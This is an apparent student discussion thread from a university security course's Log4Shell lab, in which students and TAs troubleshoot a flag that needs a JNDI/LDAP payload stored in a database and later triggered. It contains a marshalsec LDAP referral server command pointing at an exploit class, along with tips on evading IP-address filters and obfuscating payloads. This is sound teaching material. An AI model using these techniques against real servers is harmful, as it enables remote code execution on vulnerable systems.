David Robert Nygren
1d
 Replying to Linh-Dan Le
Confused what you mean by pattern. I looked at how different things are stored and see no pattern.


Reply

Linh-Dan Le
1d
 Replying to David Robert Nygren
Maybe try looking at the server logs for one of the commands, and see if you can find a variable there that has some pattern (concat).


Reply

Anonymous Badger
1d
 Replying to J. Kendall Miller
I have done this exact thing and injected the same working malicious trigger but now my ldap server isn't firing? I am almost 100% certain I found the internal variable where we just need to use its pattern and make our POST req params fit the trigger but im not sure why the server wouldnt be firing now with the same trigger 


Reply

Linh-Dan Le
1d
 Replying to Anonymous Badger
My guess is you're not formatting the url correctly, you might need an extra "$"


Reply

Anjali Chablani
1w
I am really stuck for the last 4 days. Pretty much everything I have tried is also getting resolved in POST method. The JNDI command is getting resolved in POST. What am I missing here? Turning off the listener during POST makes it not trigger. However  executing GET command does not result in obtaining the flag. I am getting an message "Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest." Any pointers appreciated. 


Reply

Robert Maness
1w
I'd suggest going back through the endpoints and looking specifically at how the logs are handling/outputting the record values that you created. Is there something you notice? Maybe some way you could sneak your LDAP call in there?


Reply

Daniel Alexander Moreno
1w

Resolved
Don't do what I did as I apparently had the right answer two days ago. Here's my two hints

Just because a GET endpoint mentions the flag, doesn't mean that it is the right endpoint. Look through all of the logs for all of the endpoints the instructions mention.

Before you edit config.properties, make sure you print it out and replicate the formatting properly because that was my issue for a very long time.


1
Reply

Joel M Tucker
1w
Great tips


Reply

Anonymous Kudu
1w

Resolved
From the setup instructions I have ran this in the terminal:

cd ~/Desktop/log4shell/target

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://172.17.0.1:4242/#Exploit"
I see that its listening but I never seem to get any logs to come through? is this typically normal? I feel like I should be seeing logs come through here when commands get sent to the ldap server.. wondering if I'm on the wrong track with this one and will only see logs come through on tail -f cs6035.log


Reply

Kevin Darlington
1w
You will only see this server log when your jndi request fires. If your jndi request isn't correct, it won't log anything. 


Reply

Cooper Michael Simpson
1w

Resolved
I feel like I know what to do but I keep getting

`2025-02-27 07:47:16 [ProductService.java:41] WARN Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it.`

And cannot update my config.properties. How can i overcome this? Spent sooo many hours on this now T__T


Reply

Anonymous Barracuda
1w
Try using the other get endpoint instead.


Reply

Cooper Michael Simpson
1w
YES, got it. idk why the other didn't work though..


Reply

Linh-Dan Le
1w
Interesting that only one endpoint works but not the other. 


Reply

Benjamin Burrell Weaver
1w

Resolved
What issues can cause my LDAP server to be hit but not ping the http server on the same port?
I can get the LDAP server to be hit both in POST and in GET but neither on triggers the exploit.


Reply

Kevin Darlington
1w
My guess would be your payload isn't correct. 


1
Reply

Benjamin Burrell Weaver
1w
You would be correct, make sure to add /Exploit to the end of your payload ha


1
Reply

Kevin Darlington
1w
 Replying to Benjamin Burrell Weaver
Nice work! Yeah, that is very important as it is what you are requesting the ldap to get for you :)


Reply

Sean Chen
1w

Resolved
interesting one


2
Reply

Sean Chen
1w

Resolved
did anyone face the issue where the POST call freezes? It doesn't seem like entering in the info any other way triggers the exploit.


1
Reply

Sean Chen
1w
a slight update. Just waiting here thinking, the traces are slowly showing up. still odd that entering it this way spends so much more time than normal. my computer cpu and memory usage didn't spike


Reply

Anonymous Tapir
1w
The same thing happened to me. Some GET requests are just stalling with no responses as well.


Reply

Joel M Tucker
1w
There shouldn't be any intensive processes. It's a simple crud application. Try restarting the container


Reply

Matthew Ruiz
1w
Any updates on this? I'm running into the same issue


Reply

Anonymous Red panda
1w
I ran into this same issue as well. I'm not 100% sure this was the cause but I was playing around with how I was obfuscating things and one of my POSTs slowed down to a crawl and it never recovered after that. I ended up just rebooting the VM and restarting everything. 


Reply

Owen Duvall
6d
I'm running into the same issue. POST and certain GET requests are taking forever to run. Restarting the container didn't seem to fix it. From looking at the running processes, it doesn't seem like anything is taking significant CPU/memory resources. Did anyone have any luck with getting around this? 


Reply

Justin Cong
4d
Thanks for posting this, glad it wasn't just me. Still trying to get past it (restarted container as well), and I was trying to find other places for the exploit before I saw your post


Reply

Cheng-Kai Zhang
2d
did you finally pass it? tried restart container but it stays the same for me...


Reply

Michael Joseph Hearn
1w

Resolved
I spent all day on this flag...our hacks have looked like !((STUFF:STUFF2:STUFF3))  etc. If you don't have STUFF unmodified stored in the database it will fail. It's not possible to get this flag otherwise.  


1
Reply

Bari Belhadj
1w

Resolved
I got the flag but I honestly don't understand why the more obvious way doesn't work. It does the same exact thing that the intended method does, yet it won't work?

I think the message "must come from data at rest" and the emphasis on "data at rest" is just confusing and is throwing everyone off. If a new product is created with the payload, isn't that basically "data at rest" ? if not, what is the definition of "data at rest" exactly? 

To everyone stuck with this. I'd advice that you create a new product and watch the logs.  If you are updating a product instead, just make sure you change something in the body every time and watch the logs.


Reply

Bari Belhadj
1w
Of course after posting this I did some reading about "Data at rest" and, well, it makes sense now 🤣 .

I will just leave this here: https://en.wikipedia.org/wiki/Data_at_rest


1
Reply

Kevin Darlington
1w
Nice work and thanks for sharing!


1
Reply

Nicolas Bautista
1w
I still think your post is valid though Bari. There is a way to store the string payload at rest through the POST request that successfully exploits through a secondary GET call. However, it can still fail and you don't get the flag because it wasn't exactly how the author intended, even though it does technically meet all of the requirements for the flag as specified in the github page.


6
Reply

Alois Maier
1w

Resolved
pretty sure i'm on the final part but i want to make sure i didn't go down a bad path.

I can write a post that will trigger sending my payload. I was stuck for a while on how I can access my lookup via a GET because nothing in the GET's seemed to be able to call where my payload resides from the POST. That was until just recently I saw something in the logs that looks like it should be holding my payload so I just need to find how I can call it. But it looks like it's relating to something that we've had very little work on in this so far in this class so I'm not sure I should devote a lot of time to this method if it's incorrect.

Ultimately my question would be, is flag 7 relevant to this flag at all?


Reply

Ashutosh Agarwal
1w
No, flag 7 is not related to this flag.


Reply

Alois Maier
1w
so can i assume i'm on the wrong path of wanting to utilize sql in some way in this flag?


Reply

Ashutosh Agarwal
1w
 Replying to Alois Maier
yes, sql is not required for this flag.


Reply

Alois Maier
1w
 Replying to Ashutosh Agarwal
and do we have to find any hidden endpoints or the flag just uses the 4 provided in the writeup?


Reply

Ashutosh Agarwal
1w
Endorsed
 Replying to Alois Maier
No hidden endpoints, just the 4 mentioned in the write up are relevant for this flag. 


2
Reply

Ruangsak Patomwong
1w

Resolved
The email has been reset every time. Then I cannot GET the payload to execute script. is that normal?


Reply

Ashutosh Agarwal
1w
Yes, you need to figure out the correct GET endpoint to retrieve the malicious data from the database and trigger the exploit.


Reply

Hailey Robinson
1w

Resolved
Make sure you restart the container regularly if you make several products with the same email, it will avoid some unnecessary confusion :')


1
Reply

Ruangsak Patomwong
1w
Does the email has been reset every time? Should I worry about email reset?


Reply

Hailey Robinson
1w
No, I just mean I created several products with the same email during the trial and error phase and then used GET by email and didn't realize I was receiving at one of my older products without the updated exploit


1
Reply

Joel M Tucker
1w
that's a valid way to reset. The DB is in memory, good tip!


1
Reply

Alois Maier
1w

Resolved
anyone get "IP address pattern detected in request body" when making their POST?


2
Reply

John Michael McPhillips
1w
There are a few ways around this


1
Reply

Jordan Tannenbaum
4d
You mind sharing some? I tried converting to decimal, hex, etc which gets past this issue, but it isn't executing in the get request.

AFAIK, I am using the correct POST format and I am using the correct GET call since I can see my JNDI call in that GET's logs. 


Reply

John Michael McPhillips
4d
 Replying to Jordan Tannenbaum
In my solution I used DNS. This requires an additional exploit step prior to executing your GET to get the flag, because the server will need to have the record. It might be too much if you are unfamiliar with doing something like that.


Reply

Jordan Tannenbaum
4d
 Replying to John Michael McPhillips
Thanks! I ended up doing something a lot simpler, but I did get some extra reading on DNS out of this!


Reply

Ruangsak Patomwong
1w

Resolved
Does the default payload in POST request provide us enough key-value pairs to get this flag or we need to add more?


Reply

John Michael McPhillips
1w
I got the flag using the example key:value from the doc


2
Reply

Ruangsak Patomwong
1w
Do you have to change the value or you can leave them as it is?


Reply

John Michael McPhillips
1w
 Replying to Ruangsak Patomwong
This should be helpful. https://edstem.org/us/courses/69023/discussion/6222726?comment=14459922 

The goal is to have your exploit triggered by the data at rest.


Reply

Ruangsak Patomwong
1w
 Replying to John Michael McPhillips
I think I can picture the direction I should go. Next step is to ask question to myself what do I do.


Reply

Daniel Alexander Moreno
1w
 Replying to Ruangsak Patomwong
Wish I could help, but I have no idea. I figured out the id thing, but I can't figure out how to save data that will be printed by both GETs since only one GET logs the contents of the retrieved records.


1
Reply

Ruangsak Patomwong
1w
 Replying to Daniel Alexander Moreno
From my observation, there is only one GET that contains log about flag. It might be something to be done with that.


Reply

Daniel Alexander Moreno
1w
 Replying to Ruangsak Patomwong
Yeah, my only reason for thinking that it needs to work in both GETs are https://edstem.org/us/courses/69023/discussion/6222726?comment=14460225 and https://edstem.org/us/courses/69023/discussion/6222726?comment=14471965. There's also disagreement about whether it is a good thing if POST triggers the exploit (https://edstem.org/us/courses/69023/discussion/6222726?comment=14488466 and https://edstem.org/us/courses/69023/discussion/6222726?comment=14484570).


Reply

Ruangsak Patomwong
1w
 Replying to Daniel Alexander Moreno
I hit a wall here and no idea what to do next.


Reply

Joel M Tucker
1w
 Replying to Daniel Alexander Moreno
It doesnt need to work in both GETS. Pay attention to the logs. Pay attention to the logical steps of when the actual call is getting triggered. 


Reply

Daniel Alexander Moreno
1w
 Replying to Joel M Tucker
Yeah, I know that the exploit needs to execute after the reset and before the read. I just can't find a log I control which is printed between those two operations.


Reply

Himanshu Singh
2d
 Replying to Daniel Alexander Moreno
Did you find one?


Reply

Daniel Alexander Moreno
2d
 Replying to Himanshu Singh
Yes, I did. I recommend reading https://edstem.org/us/courses/69023/discussion/6222726?comment=14529309 as it turns out I was on the wrong track.


Reply

Daniel Alexander Moreno
1w

Resolved
Are there any hints on how to retrieve the id's value so that it can be inserted into the properties file per "You will write a new property product.id that should have the value set to the id of the malicious product record that you have created/updated"?


Reply

Ashutosh Agarwal
1w
Once you create a product using the POST endpoint, you will get the product id value in the api response. 


Reply

Daniel Alexander Moreno
1w
Well, I already knew that the GET requests would return the id so I suppose that means I need to focus on the update part of the instructions.


Reply

Xiaohua Cai
1w

Resolved
I have use post method to save data in the database, and use get method to fetch the data. It can hit the LDAP server and run the Exploit.class file. But the problem is it shows Flag not obtained due to failed attempt. JNDI malicious must come from data at rest. 

I inject the malicious payload on Post method, this will trigger hitting the LDAP server as well. I am not sure my error is related to this or not. The Get api I use also can hit the LDAP server but showing the flag error instead of showing me correct flag code. 


Reply

Ruangsak Patomwong
1w
I think I stuck at the same point.


Reply

Kevin Darlington
1w
This is a hint to let you know that you need to approach this flag differently. You need to think about data at rest and how you can leverage that. 


Reply

Xiaohua Cai
1w
But I already send a post and store the information in the database and then send a get method to fetch information from server. so this does not count as data at rest? 


10
Reply

Ruangsak Patomwong
1w

Resolved
How to craft the payload since GET endpoint do not process any value that we POST? and null value that we can modify we edit that from curl not from the rest data itself.


Reply

Ruangsak Patomwong
1w
Please give me some hint. I'm stuck on this for 3 days and go to nowhere.


Reply

Kevin Darlington
1w
Think about data at rest and how you can leverage that for this flag. This flag is very different than the rest for this reason. 


Reply

Ruangsak Patomwong
1w

Resolved
I think I can trigger the script when POST new data but not when I GET the data.


Reply

Kshitij Gupta
1w
Are you using the right endpoint? Did you try everything?


Reply

Ruangsak Patomwong
1w
I know that GET has a special value that can be modified to trigger the script but it is not the intension of this flag. It must be normal call. How can GET execute script if it not read any value but directly log them to sql data?


Reply

Ashutosh Agarwal
1w
The exploit must be triggered via data stored in the database (data at rest). If your POST request is triggering the LDAP server, it indicates that the payload is being executed too early. Ensure the POST request only persists the payload without executing it. Then use the correct GET endpoint to retrieve the malicious data from the database and trigger the exploit.


Reply

Omar Arin Solaiman
2w

Resolved
Running into issue where my exploit runs from... one part of the data as opposed to many?

But when I check the log syntax, the executable part looks exactly the same?


Reply

Omar Arin Solaiman
2w
I figured it out

Do not over-complicate your obfuscation. 


1
Reply

Caleb Ryan Massengill
1w
This was helpful, but don't read this as "You don't need to do any obfuscation to make this work."  I had to do some obfuscation, but significantly less than in previous flags.

Overall, I think this is the most satisfying/entertaining flag. Once you figure out the correct way of passing the data so that the exploit can execute from data at rest, it turns into a bit of a puzzle, which I loved. 

Another note here, my exploit still executed when I posted the data, so don't let that throw you off if it does. In my case, it still worked when I called the correct endpoint, even though it triggered the exploit when I did my POST as well.


1
Reply

Hailey Robinson
1w
 Replying to Caleb Ryan Massengill
I second this!! I spent far too long worrying about triggering the exploit in only one place when it did not seem to matter


Reply

Mason Lunsford
1w
Just got this flag as well - ended up spending waaay too much time on it. For anyone still stuck on it, I'll echo what @Omar said and go further and say that even if the lookup is being executed properly and from the right location, the way you obfuscated it may still be hindering you from getting the flag.


Reply

Yan Ting Liu
1w
I highly recommend this thread for people like me who have been stuck for a long time. I tried various approaches and even discovered a hidden variable in the POST request that could trigger the Log4j vulnerability, but it turned out there wasnt for any hidden point. Make sure to "double check your payload like they mentioned"—it's not a good one, to be honest, even if your payload successfully hitting correctly from data at rest.


1
Reply

Omar Arin Solaiman
2w

Resolved
I am definitely seeing it run from resting data via the get/query I'm utilizing...

But the flag isn't coming, even with the file being updated. Using the end result of Flag2, I am able to see that the config file has the relevant updated id after running. 


Does the get used HAVE to be the ONE specific one? Because the other is definitely doing it.

I will say I think my method has resulted in it running twice... I should fix that.


Reply

David Dexter
2w

Resolved
How can we update a product? Running curl -X POST 'http://localhost:8080/rest/products/product/a06524fb-....' gives me a 415 error


Reply

Anonymous Ibex
2w
Id should be part of request body


Reply

Kshitij Gupta
2w

Resolved
Is there any other endpoint we have to use other than the four we have been provided with? I assume no, but thought may check.


Reply

Ruangsak Patomwong
2w

Resolved
I can understand how this flag should work but I cannot get past the teapot when POST new record.


Reply

Anjali Chablani
2w
same.


Reply

Ruangsak Patomwong
2w
Find a way to put the data in but I cannot trigger the script with GET.


Reply

Ruangsak Patomwong
2w
And my email in the created data is keep changing to default when I use one of the GET method. 


Reply

Anonymous Ibex
2w

Resolved
Any guidance on "Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest"?

I have inserted a malicious record with an LDAP call using POST and I am also able to add product.id to config.properties with the GET call. I have followed the same steps as other tasks in the assignment.


Reply

Anonymous Penguin
2w
Pretty much in the same spot. I don't know why I would get that specific error when it is actually executing from data at rest.


Reply

Anonymous Crocodile
2w
In the same boat.


Reply

Anonymous Crocodile
2w
Just figured it out. In my case, my payload that I was storing in the database was being triggered way too many times when I called the "GET" method. My suggestion is to look at the body of the "POST" method and see how you can use those parameters to form your payload. Viewing the output from the logs also hints at this.


3
Reply

John Michael McPhillips
2w
 Replying to Anonymous Crocodile
Thanks, this helped for me too.


Reply

Omar Arin Solaiman
2w
 Replying to John Michael McPhillips
I figured out the location... but I can't get it to run it even when the string looks exactly the same. Fall into the same problem?


Reply

Anonymous Badger
1d
 Replying to Omar Arin Solaiman
I am at this point any tips?


Reply

Omar Arin Solaiman
1d
 Replying to Anonymous Badger
https://edstem.org/us/courses/69023/discussion/6222726?comment=14479901


Reply

Nicolas Bautista
1w
 Replying to Anonymous Crocodile
Yeah this helped a lot. Thank you.


Reply

Christopher Troupe
1w
 Replying to Anonymous Crocodile
Can you or someone elaborate on this? I see that I trigger the exploit and it happens a lot, but I'm not sure why it triggers multiple times or how to trigger it once. 

Edit: Triggering multiple times did affect me getting the flag at all, this was a time wasting red herring for me. 


Reply

Philipp Werner
2w

Resolved
I think I am close, but I'm not sure... I believe I have the correct statements to insert my payload into the database. However, when I make the GET request, neither of my servers is triggered. Do I need a different approach to execute the payload? I'm struggling with this...


1
Reply

Kshitij Gupta
2w
Same!


Reply

Philipp Werner
2w
I solved it. My fault was that I used the wrong endpoint...


2
Reply

Ruangsak Patomwong
2w
 Replying to Philipp Werner
How did you pass the teapot when you post new data?


Reply

Anonymous Eland
2w
 Replying to Ruangsak Patomwong
Some of the learning resources circulated have good info on evasion tactics.


Reply

Kavish Desai
2w
 Replying to Ruangsak Patomwong
I am not sure if I did it the way it was supposed to be meant but I didn't perform any evasion and it worked just fine


Reply

Kshitij Gupta
2w
 Replying to Kavish Desai
This is the hint that help me get on the right track and solve the flag. 

Definitely not an easy flag if you are on the wrong track. I followed all the hints of looking through the logs and tried several tactics but in the end the simplest way as mentioned above helped me get it. 


1
Reply

Joel M Tucker
2w
 Replying to Kshitij Gupta
nice job!


1
Reply

Michael Derryberry
2w
 Replying to Kshitij Gupta
Yes I am having a bad time with this one, It's been the hardest flag of the course so far for me. I feel that's because I am doing what you're describing: being on the wrong track. Unfortunately it's very hard to determine whether or not I'm on the wrong track. But are you saying removing evasion/obfuscation actually helped you here? As far as I can tell you need some form of obfuscation for the POST request.


Reply

Kavish Desai
2w
 Replying to Michael Derryberry
Think of different ways of how you can send your payload and I would suggest carefully looking at the Log when you send your post request to see whats happening in the application and how your POST request is processed. 


Reply

Kshitij Gupta
2w
 Replying to Michael Derryberry
There is a way. But keeping an eye on which tactic makes it hit the server helped me.


Reply

Lewis Won
1w
 Replying to Philipp Werner
This tip is super important!


1
Reply

Kshitij Gupta
2w

Resolved
I am able to leak out the java version but when I try to leakout the payload the attribute containing the payload does not get logged and there is no error message as well, so I am a bit confused as to what may be the error. Everything else other than the payload gets logged or has a geniune error message. I am a bit lost here if this is expected or I need to just reboot my machine. Thanks!


Reply

John Michael McPhillips
2w

Resolved
I don't understand the objective of this flag. We are creating a malicious product entry, which would trigger our exploit? In the example given that doesn't seem to be the case. The exploit would then inject the product.id of the product we already created, and the product we are calling? I've read this several times and none of makes sense to me. There is also a way to trigger the exploit that is identical to flag3, so why would we need to use malicious code within the product details to execute the exploit? Very confusing what is supposed to be done here.

Are we trying to redirect any product GET to the product values of the new product we created?  What is the goal?


Reply

Patrick Jacobs
2w
We are creating a malicious product entry, which would trigger our exploit? 
Yes, per:

Use the product POST endpoint to persist a record to the database that, when retrieved later, will trigger the LDAP call.
I agree that at first glance, the flag seems to get to the exploit in a roundabout way, but try to focus on one thing at a time:

Use the product POST endpoint to persist a record to the database ...
... update the “config.properties” file saved in the root directory of the application ...
... upon calling the right GET endpoint, it will trigger the exploit and, if successful, will generate the Flag 6 message in the logs.
These are three distinct steps.

why would we need to use malicious code within the product details to execute the exploit?
You won't be able to get the flag using any other mechanism than using a record in the DB:

When the application fetches the record upon calling the right GET endpoint, it will trigger the exploit and, if successful, will generate the Flag 6 message in the logs.

Note: You will have to trigger the LDAP call with the malicious record in order to generate the Flag.

6
Reply

Joel M Tucker
2w
Endorsed
nice, I really can't add anything else


2
Reply

Patrick Jacobs
1w
Endorsed
 Replying to Joel M Tucker


12
Reply

Kevin Darlington
1w
 Replying to Patrick Jacobs
LOL


1
Reply

Omar Arin Solaiman
2w

Resolved
Little confused between the errors and the flag description

Errors say I should worry about the customer.service.email property 

However the flag says "You will write a new property product.id that should have the value set to the id of the malicious product record that you have created/updated."

I already know one vector, and I think I know the vector to uitilize the data at rest... But it's confusing what should be doing what?

Is the goal for us to have data at rest that we call that then triggers the exploit update? And that exploit updates the product.id, not the customer.service.email?


1
Reply

Ashutosh Agarwal
2w
Yes, the goal is to have data at rest (stored in the database) that, when retrieved via a GET request, triggers the exploit. The exploit should update the product.id property in the config.properties file with the malicious product's ID—not the customer.service.email.


Reply

Kshitij Gupta
2w

Resolved
When I create a new product via POST /rest/products/product, I include an email in the request.
 
When I retrieve the product using GET /rest/products/product?email=example@example.com, the email is correctly returned with the product attributes

 However, when I retrieve the same product using GET /rest/products/product/<id>, the email does not persist and appears to be missing or reset to a default value.

Before proceeding further with this flag, do I need to ensure the email persists correctly in GET by ID, or can I move forward despite this issue? A 


Reply

Abhishek Sathiabalan
2w
Move forward.


4
Reply

Gen Sheng Zhang
2w

Resolved
Great flag once it clicks. There should only be one GET that works, read the logs carefully about where you want the exploit to happen, which is the key thing for most of the flags tbh. 


1
Reply

Arianna Rachel Lanz
2w
Any other hints here? I'm pretty sure I see where the exploit is supposed to happen based on the logs from the POST request and the logs from one of the GET requests. Still, when I call the GET request, I see the HTTP server and my exploit file being hit multiple times...


1
Reply

Gen Sheng Zhang
2w
I think being hit multiple times is not a concern, as long as the exploit is called at a certain point in the log and subsequently does the properties change as required, you can still get the flag.


1
Reply

Abhishek Sathiabalan
2w
It can be a concern, if you modify the file multiple times


1
Reply

Yongmin Li
2w
 Replying to Abhishek Sathiabalan
I think this is one of the key concerns


Reply

Anonymous Eland
2w
Are you sure? I was able to get my exploit to work on multiple GET endpoints.


Reply

Gen Sheng Zhang
2w
A true genius in that case, would love to learn how someday :)


Reply

Yongmin Li
2w

Resolved
i keep the Reverse Shell open during this flag, after execute the request and payload, the config.properties was updated as below
cat config.properties
#Mon Feb 24 06:44:28 GMT 2025
customer.service.email=example@example.com
topic.name=user.info
rating=PG
product.id=5f84925f-32b5-4717-8017-2273ef550b77

but i am still getting below error


WARN Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it.


Reply

Abhishek Sathiabalan
2w
Are you hard coding the datetime?


Reply

Yongmin Li
2w
No.


Reply

Yongmin Li
2w
Finally get the flag, I think I was misleading by "the real world vulnerability" again. test is test, they are deliberately designed.

My hint is pay CLOSE attention to all the output logs, then think , what might be some technic they want us to learn.

The error messages are also kind of hint. think why those error message are in place?
by error messages,  i don't mean below

Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it

WARN Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest

1
Reply

Joel M Tucker
2w
Yes, while we try to make these projects as "real world" as possible, they are deliberately designed to work in certain ways that highlight different aspects of the vulnerabilities. And yes, error messages are also designed to be helpful 


1
Reply

Cooper Michael Simpson
1w
How did you overcome WARN Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it. ??

I feel like I know what to do for the flag but I keep getting this


1
Reply

Michael Derryberry
2w

Resolved
I seem to be dancing between multiple errors while attempting different endpoints. 
It's either: WARN Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest

OR:
 the customer.service.email property is not in config.properties OR overwriting file instead of updating it

I've spent most of my day on this flag so I must be missing something or we are
not getting enough guidance on this task.


3
Reply

Anonymous Penguin
2w
Same.


Reply

Abdelrahman Ibrahem
2w
You’re just missing some glaring issue that’s staring you right in the face. I don’t think there is any missing guidance; the error messages could be improved a bit, though. I believe this task is what cemented my understanding of Log4j vulnerabilities.


1
Reply

Anonymous Penguin
2w

Resolved
I am saving the exploit on the database. I don't know if we are supposed to create the new property as the exploit from the data at rest or if we are supposed to make another exploit for the data at rest. I am asking because there are different ways to trigger log4shell on this flag. There is a out of place variable and there is data at rest. Are we supposed to use both? also it triggers the exploit when I create a product so that's another different way of exploit. I already receive the Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest when coming from data at rest. So please I would like to know what am I doing wrong :)

thanks


Reply

Ashutosh Agarwal
2w
Focus on the data-at-rest attack vector. The goal is to store a malicious payload in the database and retrieve it later to trigger the exploit. The "out-of-place variable" is not relevant for this flag.


1
Reply

Anuj Goel
1w
Can you help in informing if we need to use just one variable or more than one?

Also, I am seeing the code that generates the flag is only executed on one API that does not seem to process variables. What am I missing? 


Reply

Kevin Darlington
1w
 Replying to Anuj Goel
There will only be 1 attack vector per se, but you really need to think about your payload, how the app stores data, how it retrieves data etc. This is a completely different thought process than all the other flags. 


Reply

Anuj Goel
1w
 Replying to Kevin Darlington
I have the payload that is executing the exploit on both posts and get, but I still don't get the flagged. I am confused as to why. The instructions say we need to add a new product id to the config.properties file. However, the log message says's 

WARN Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it.

What is going on?

In previous flags, the error message and instruction were aligned. How can I be sure that my exploit code it making the correct changes that Flag is expecting?


Reply

Fatima Muhammad Barakzai
2w

Resolved
I am confused about what we're supposed to be doing for this flag. I added the product.id entry into the properties file, but i'm seeing this in the logs:


Flag not obtained due to failed attempt, 
the customer.service.email property is not 
in config.properties OR overwriting file instead of 
updating it

4
Reply

Fatima Muhammad Barakzai
2w
I can see the email tho, am I supposed to change it?


1
Reply

Daniel James Poulin
2w
Did you get anywhere with this one? I am able to update the product email with a query. I found another endpoint with something similar to Flag5 so I can trigger a call back and overwrite or append whatever I want to the filesystem. I added the product.id and updated the customer.service.email. I am not sure what else we are supposed to be doing.


1
Reply

Fatima Muhammad Barakzai
2w
 Replying to Daniel James Poulin
nope, I feel like the requirements are super unclear on this one. I'm also able to manipulate the file system but aside from product.id i'm not sure what else i'm supposed to be doing with it

were we supposed to update the product email? 


3
Reply

Daniel James Poulin
2w
 Replying to Fatima Muhammad Barakzai
I think the key part from the write up is:

"When the application fetches the record upon calling the right GET endpoint, it will trigger the exploit"

So the you have the LDAP query in place before hand and you have to trigger this one via the GET request using the email property, no other way.

And the exploit being "You will write a new property product.id that should have the value set to the id of the malicious product record that you have created/updated."


Reply

Fatima Muhammad Barakzai
2w
 Replying to Daniel James Poulin
I'm using a different way to trigger the LDAP query, but it does add the new product.id


Reply

Fatima Muhammad Barakzai
2w
 Replying to Daniel James Poulin
I feel like I understand all the concepts, just don't don't know what they want us to do 


1
Reply

Daniel James Poulin
2w
 Replying to Fatima Muhammad Barakzai
I am using a similar method as Flag5. I think that is the issue, it's not the email property triggering it.


1
Reply

Abdelrahman Ibrahem
2w
 Replying to Daniel James Poulin
I made a script that loops over everything I can set and monitored the log file for a leak.

I quickly found the set and get endpoints.

Another tip is to break it down into small steps. Make sure you’re hitting the correct endpoints by first trying to leak the Java version, then focusing on getting your exploit code running, and finally modifying what needs to be changed.


3
Reply

Daniel James Poulin
2w
 Replying to Abdelrahman Ibrahem
I think there is a specific way they want it triggered. I just got it to return my persisted email but I received this:

WARN Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest


6
Reply

Arianna Rachel Lanz
2w
 Replying to Daniel James Poulin
I've found that after I make a POST with my exploit code when I call each of the GET endpoints: 
- one returns WARN Flag not obtained due to failed attempt. JNDI malicious trigger must come from data at rest
- another returns Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it
- and the third doesn't trigger the exploit at all

I'm not super stuck yet, but I just thought I'd share in case others are seeing the same thing!

🤷‍♀️ 


6
Reply

Daniel James Poulin
2w
 Replying to Arianna Rachel Lanz
I am at the same point. I think it's something to do with timing or order of operations. Just need to figure it out.


Reply

Arianna Rachel Lanz
2w
 Replying to Daniel James Poulin
I also just noticed something in the logs that may be useful.


Reply

Fatima Muhammad Barakzai
2w
 Replying to Arianna Rachel Lanz
any hints? Still stuck on this one


Reply

Abdelrahman Ibrahem
2w
 Replying to Daniel James Poulin
This message was a bit confusing for me too, I don’t think how it’s being triggered is the issue as much as it’s what is being triggered.


Reply

Fatima Muhammad Barakzai
2w
 Replying to Abdelrahman Ibrahem
Did you get the flag this way?


Reply

Abdelrahman Ibrahem
2w
 Replying to Fatima Muhammad Barakzai
Yes, but the key is step by step and really monitor how your payload impacts the logs.


1
Reply

Daniel James Poulin
2w
 Replying to Abdelrahman Ibrahem
Still stuck. I was using a method similar to Flag3 and modifying the URL to reach out to the LDAP server but I assumed that wasn't going anywhere since it says it needs to be triggered by data at rest.

I can do what the write up says and persist a record in the database and when I retrieve it using one of the GET methods, I see it query the LDAP server but I keep getting the "JNDI malicious trigger must come from data at rest" which.... it is. Not sure where to go from here.


2
Reply

Abhishek Sathiabalan
2w
 Replying to Daniel James Poulin
Have you verified your code isn't executing multiple times? Are you passing a JNDI in the parameters?


1
Reply

Fatima Muhammad Barakzai
2w
 Replying to Abhishek Sathiabalan
Do we pass it into the parameters or in the body?


Reply

William David Done
2w
 Replying to Daniel James Poulin
I'm stuck on this same step... even though the JNDI statement is coming from the database, it has the "JNDI malicious trigger must come from data at rest" error.


1
Reply

Daniel James Poulin
2w
 Replying to William David Done
Finally got it. All I will say is I didn't spend enough time looking at the POST logs.


4
Reply

William David Done
2w
 Replying to Daniel James Poulin
Thank you for the hint - that did it for me!


Reply

Kshitij Gupta
2w
 Replying to Daniel James Poulin
I understand the concept here, but I am still stuck at "Flag not obtained due to failed attempt, the customer.service.email property is not in config.properties OR overwriting file instead of updating it." I am a bit confused as to how to persist the email. I have looked at flag 3 and I am trying to follow the same line of thought for config.props


Reply

Anonymous Eland
2w
 Replying to Kshitij Gupta
I would look at the output from your python HTTP server and confirm whether or not it's serving your exploit file. If it is, then that message is probably because you're overwriting that file improperly as the message suggests. If it's not, then obviously your code isn't triggering to begin with.


2
Reply

Anonymous Eland
2w
 Replying to Kshitij Gupta
As far as the payload goes, hopefully without giving away too much, look carefully at what's being written to the database and how it looks when it's read from it. See if there's anything you can take advantage of.


2
Reply

Robert Smithers III
2w
 Replying to Daniel James Poulin
I'm still stuck with the "JNDI malicious trigger must come from data at rest" warning, but I'm fairly confident that I crafted the payload correctly. I reviewed the post logs, but I assume that just clarifies how to build it. 

I am not passing anything to directly cause the JNDI callback other than the payload stored in the database... am I missing something more?


1
Reply

Rodrigo Alvarado Chacon
2w
 Replying to Robert Smithers III
I am in the same boat as you, I am definetly running the payload from the database calling the specific endpoint. I don't what else I should try


1
Reply

Arianna Rachel Lanz
2w
 Replying to Daniel James Poulin
I’m pretty sure I see how to construct the exploit in the POST payload from looking at the POST logs, and my exploit is definitely triggered this way when using one of the GETs that reads the key value, and yet I still see the above errors. :/ 


Reply

Anonymous Eland
2w
 Replying to Arianna Rachel Lanz
The payload you craft should work for both of the GETs, if only one of them is triggering, you should take a look at how you're crafting it to see if you can get it to trigger for the other one.

Another hint: look carefully at what's being written to and read from the database, especially as pertains to the logs (obviously, since this is log4j and all). See if there's anything you can leverage to help craft your payload.


Reply

This comment was deleted
Arianna Rachel Lanz
2w
 Replying to (Deleted)
